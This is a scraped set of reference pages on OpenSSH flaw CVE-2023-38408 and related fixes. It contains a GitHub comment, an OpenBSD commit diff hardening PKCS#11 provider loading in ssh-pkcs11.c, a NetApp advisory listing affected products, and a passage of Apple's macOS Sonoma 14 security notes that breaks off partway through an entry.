### @Vincent-Lee9870522 **[Vincent-Lee9870522](/Vincent-Lee9870522)** commented on `[7bc29a9](/openbsd/src/commit/7bc29a9d5cd697290aa056e94ecee6253d3425f8)` [Sep 23, 2024](#commitcomment-147062115)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Excuse me,Someone can tell me how to download this file and how to use it? I'm not a server user.

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2F7bc29a9d5cd697290aa056e94ecee6253d3425f8) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_08ce7e4a_20250110_133625.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2Ff03a4faa55c4ce0818324701dadbf91988d7351d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2Ff03a4faa55c4ce0818324701dadbf91988d7351d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=openbsd%2Fsrc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openbsd](/openbsd)
/
**[src](/openbsd/src)**
Public

* [Notifications](/login?return_to=%2Fopenbsd%2Fsrc) You must be signed in to change notification settings
* [Fork
  874](/login?return_to=%2Fopenbsd%2Fsrc)
* [Star
   3.3k](/login?return_to=%2Fopenbsd%2Fsrc)

* [Code](/openbsd/src)
* [Pull requests
  0](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

Additional navigation options

* [Code](/openbsd/src)
* [Pull requests](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

## Commit

[Permalink](/openbsd/src/commit/f03a4faa55c4ce0818324701dadbf91988d7351d)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

terminate process if requested to load a PKCS#11 provider that

[Browse files](/openbsd/src/tree/f03a4faa55c4ce0818324701dadbf91988d7351d)
Browse the repository at this point in the history

```
isn't a PKCS#11 provider; from / ok markus@
```

* Loading branch information

[![@djmdjm](https://avatars.githubusercontent.com/u/170281?s=40&v=4)](/djmdjm)

[djmdjm](/openbsd/src/commits?author=djmdjm "View all commits by djmdjm")
committed
Jul 19, 2023

1 parent
[82821a6](/openbsd/src/commit/82821a618568f0edc5dd97e8c920c69266b62eca)

commit f03a4fa

Showing
**1 changed file**
with
**3 additions**
and
**5 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

8 changes: 3 additions & 5 deletions

8
[usr.bin/ssh/ssh-pkcs11.c](#diff-12771f87455e5f3606a71af5d06169931cfa52151138f989f721acd6f2ad5152 "usr.bin/ssh/ssh-pkcs11.c")

Show comments

[View file](/openbsd/src/blob/f03a4faa55c4ce0818324701dadbf91988d7351d/usr.bin/ssh/ssh-pkcs11.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | /\* $OpenBSD: ssh-pkcs11.c,v 1.56 2023/03/08 05:33:53 tb Exp $ \*/ |
|  |  | /\* $OpenBSD: ssh-pkcs11.c,v 1.57 2023/07/19 13:55:53 djm Exp $ \*/ |
|  |  | /\* |
|  |  | \* Copyright (c) 2010 Markus Friedl. All rights reserved. |
|  |  | \* Copyright (c) 2014 Pedro Martelletto. All rights reserved. |
| Expand Down  Expand Up | | @@ -1512,10 +1512,8 @@ pkcs11\_register\_provider(char \*provider\_id, char \*pin, |
|  |  | error("dlopen %s failed: %s", provider\_id, dlerror()); |
|  |  | goto fail; |
|  |  | } |
|  |  | if ((getfunctionlist = dlsym(handle, "C\_GetFunctionList")) == NULL) { |
|  |  | error("dlsym(C\_GetFunctionList) failed: %s", dlerror()); |
|  |  | goto fail; |
|  |  | } |
|  |  | if ((getfunctionlist = dlsym(handle, "C\_GetFunctionList")) == NULL) |
|  |  | fatal("dlsym(C\_GetFunctionList) failed: %s", dlerror()); |
|  |  | p = xcalloc(1, sizeof(\*p)); |
|  |  | p->name = xstrdup(provider\_id); |
|  |  | p->handle = handle; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f03a4fa`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2Ff03a4faa55c4ce0818324701dadbf91988d7351d) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.netapp.com_e2f09849_20250110_133629.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2023-38408 OpenSSH Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20230803-0010)

## CVE-2023-38408 OpenSSH Vulnerability in NetApp Products

circle-info

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20230803-0010 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20230803-0010 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20230803-0010 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20230803-0010 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20230803-0010
**Version:**
10.0

**Last updated:**
10/18/2024

**Status:**
Interim.

**CVEs:** CVE-2023-38408

Overview
#### Summary

Multiple NetApp products incorporate OpenSSH. OpenSSH versions prior to 9.3p2 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408) | 9.8 (CRITICAL) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://www.openssh.com/security.html>
* <https://www.openssh.com/txt/release-9.3p2>

Affected Products
#### Affected Products

* Active IQ Unified Manager for VMware vSphere
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* ONTAP Select Deploy administration utility

#### Products Under Investigation

* NetApp HCI Compute Node (Bootstrap OS)

#### Products Not Affected

* AFF BIOS - A700s
* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Volumes ONTAP Mediator
* Data Infrastructure Insights Acquisition Unit (formerly Cloud Insights Acquisition Unit)
* Data Infrastructure Insights Storage Workload Security Agent (formerly Cloud Insights Storage Workload Security Agent)
* Data Infrastructure Insights Telegraf Agent (formerly Cloud Insights Telegraf Agent)
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 2820
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF BIOS - A250/500f/C250
* FAS/AFF BIOS - A300/8200/C190/A220/2720/2750/A150
* FAS/AFF BIOS - A320
* FAS/AFF BIOS - A700/9000
* FAS/AFF BIOS - A800/C800
* FAS/AFF BIOS - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Baseboard Management Controller (BMC) - FAS2820
* FAS/AFF Service Processor - A300/8200
* FAS/AFF Service Processor - A700/9000
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM12 SAS Disk Shelf Firmware
* IOM12B SAS Disk Shelf Firmware
* IOM12E SAS Disk Shelf Firmware
* IOM12F SAS Disk Shelf Firmware
* IOM12G SAS Disk Shelf Firmware
* IOM6 SAS Disk Shelf Firmware
* IOM6E SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster DataCollector
* MetroCluster Tiebreaker
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9 (formerly Clustered Data ONTAP)
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* RcfFileGenerator for MetroCluster IP
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100/SG1100/SG110
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112/SG6160
* StorageGRID Baseboard Management Controller (BMC) - SG6060/SG6160/SGF6024/SGF6112/SG100/SG110/SG1000/SG1100
* System Manager 9.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **Active IQ Unified Manager for VMware vSphere** | <https://mysupport.netapp.com/site/products/all/details/activeiq-unified-manager/downloads-tab/download/62791/9.14> |
| **ONTAP Select Deploy administration utility** | <https://mysupport.netapp.com/site/products/all/details/ontapselect-deploy/downloads-tab/download/62910/9.14.1> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Interim.**

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20230803-0010>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20230803 | Initial Public Release |
| 2.0 | 20230808 | E-Series SANtricity OS Controller Software 11.x moved to Products Not Affected |
| 3.0 | 20230814 | ONTAP tools for VMware vSphere and FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250 moved to Products Not Affected |
| 4.0 | 20230822 | ONTAP Select Deploy administration utility moved to Affected Products |
| 5.0 | 20231003 | NetApp SolidFire & HCI Storage Node (Element Software), NetApp SolidFire & HCI Management Node moved to Affected Products |
| 6.0 | 20231010 | Brocade Fabric Operating System Firmware moved to Affected Products |
| 7.0 | 20240311 | Brocade Fabric Operating System Firmware moved to Products Not Affected |
| 8.0 | 20240425 | ONTAP Select Deploy administration utility added to Software Versions and Fixes |
| 9.0 | 20240520 | Active IQ Unified Manager for VMware vSphere added to Software Versions and Fixes |
| 10.0 | 20241018 | AFF Baseboard Management Controller (BMC) - A700s moved to Products Not Affected |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from support.apple.com_f37ba70e_20250110_133630.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of macOS Sonoma 14

This document describes the security content of macOS Sonoma 14.

## About Apple security updates

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security releases](https://support.apple.com/kb/HT201222) page.

Apple security documents reference vulnerabilities by [CVE-ID](https://www.cve.org/About/Overview) when possible.

For more information about security, see the [Apple Product Security](https://support.apple.com/kb/HT201220) page.

## macOS Sonoma 14

Released September 26, 2023

### Airport

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to read sensitive location information

Description: A permissions issue was addressed with improved redaction of sensitive information.

CVE-2023-40384: Adam M.

### AMD

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: A buffer overflow issue was addressed with improved memory handling.

CVE-2023-32377: ABC Research s.r.o.

### AMD

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: The issue was addressed with improved memory handling.

CVE-2023-38615: ABC Research s.r.o.

### App Store

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A remote attacker may be able to break out of Web Content sandbox

Description: The issue was addressed with improved handling of protocols.

CVE-2023-40448: w0wbox

### Apple Neural Engine

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: The issue was addressed with improved memory handling.

CVE-2023-40432: Mohamed GHANNAM (@\_simo36)

CVE-2023-42871: Mohamed GHANNAM (@\_simo36)

Entry updated December 22, 2023

### Apple Neural Engine

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to disclose kernel memory

Description: The issue was addressed with improved memory handling.

CVE-2023-40399: Mohamed GHANNAM (@\_simo36)

### Apple Neural Engine

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to disclose kernel memory

Description: An out-of-bounds read was addressed with improved input validation.

CVE-2023-40410: Tim Michaud (@TimGMichaud) of Moveworks.ai

### AppleMobileFileIntegrity

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access sensitive user data

Description: The issue was addressed with additional permissions checks.

CVE-2023-42872: Mickey Jin (@patch1t)

Entry added December 22, 2023

### AppSandbox

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access protected user data

Description: The issue was addressed with improved checks.

CVE-2023-42929: Mickey Jin (@patch1t)

Entry added December 22, 2023

### AppSandbox

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access Notes attachments

Description: The issue was addressed with improved restriction of data container access.

CVE-2023-42925: Wojciech Reguła (@\_r3ggi) and Kirin (@Pwnrin)

Entry added July 16, 2024

### Ask to Buy

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access protected user data

Description: The issue was addressed with improved checks.

CVE-2023-38612: Chris Ross (Zoom)

Entry added December 22, 2023

### AuthKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access user-sensitive data

Description: The issue was addressed with improved handling of caches.

CVE-2023-32361: Csaba Fitzl (@theevilbit) of Offensive Security

### Bluetooth

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An attacker in physical proximity can cause a limited out of bounds write

Description: The issue was addressed with improved checks.

CVE-2023-35984: zer0k

### Bluetooth

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access sensitive user data

Description: A permissions issue was addressed with additional restrictions.

CVE-2023-40402: Yiğit Can YILMAZ (@yilmazcanyigit)

### Bluetooth

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to bypass certain Privacy preferences

Description: A permissions issue was addressed with additional restrictions.

CVE-2023-40426: Yiğit Can YILMAZ (@yilmazcanyigit)

### BOM

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing a file may lead to a denial-of-service or potentially disclose memory contents

Description: The issue was addressed with improved bounds checks.

CVE-2023-42876: Koh M. Nakagawa (@tsunek0h)

Entry added December 22, 2023

### bootp

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to read sensitive location information

Description: A privacy issue was addressed with improved private data redaction for log entries.

CVE-2023-41065: Adam M., and Noah Roskin-Frazee and Professor Jason Lau (ZeroClicks.ai Lab)

### Calendar

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access calendar data saved to a temporary directory

Description: A privacy issue was addressed with improved handling of temporary files.

CVE-2023-29497: Kirin (@Pwnrin) and Yishu Wang

### CFNetwork

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may fail to enforce App Transport Security

Description: The issue was addressed with improved handling of protocols.

CVE-2023-38596: Will Brattain at Trail of Bits

### Clock

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to read sensitive location information

Description: A privacy issue was addressed with improved private data redaction for log entries.

CVE-2023-42943: Cristian Dinca of "Tudor Vianu" National High School of Computer Science, Romania

Entry added July 16, 2024

### ColorSync

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to read arbitrary files

Description: The issue was addressed with improved checks.

CVE-2023-40406: JeongOhKyea of Theori

### CoreAnimation

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may lead to a denial-of-service

Description: The issue was addressed with improved memory handling.

CVE-2023-40420: 이준성(Junsung Lee) of Cross Republic

### Core Data

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to bypass Privacy preferences

Description: This issue was addressed by removing the vulnerable code.

CVE-2023-40528: Kirin (@Pwnrin) of NorthSea

Entry added January 22, 2024

### Core Image

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access edited photos saved to a temporary directory

Description: An issue was addressed with improved handling of temporary files.

CVE-2023-40438: Wojciech Regula of SecuRing (wojciechregula.blog)

Entry added December 22, 2023

### CoreMedia

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A camera extension may be able to access the camera view from apps other than the app for which it was granted permission

Description: A logic issue was addressed with improved checks

CVE-2023-41994: Halle Winkler, Politepix @hallewinkler

Entry added December 22, 2023

### CUPS

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A remote attacker may be able to cause a denial-of-service

Description: The issue was addressed with improved bounds checks.

CVE-2023-40407: Sei K.

### Dev Tools

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to gain elevated privileges

Description: This issue was addressed with improved checks.

CVE-2023-32396: Mickey Jin (@patch1t)

CVE-2023-42933: Mickey Jin (@patch1t)

Entry updated December 22, 2023

### FileProvider

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to bypass Privacy preferences

Description: A permissions issue was addressed with additional restrictions.

CVE-2023-41980: Noah Roskin-Frazee and Professor Jason Lau (ZeroClicks.ai Lab)

### FileProvider

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access user-sensitive data

Description: This issue was addressed with improved data protection.

CVE-2023-40411: Noah Roskin-Frazee and Prof. J. (ZeroClicks.ai Lab), and Csaba Fitzl (@theevilbit) of Offensive Security

Entry added December 22, 2023

### Game Center

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access contacts

Description: The issue was addressed with improved handling of caches.

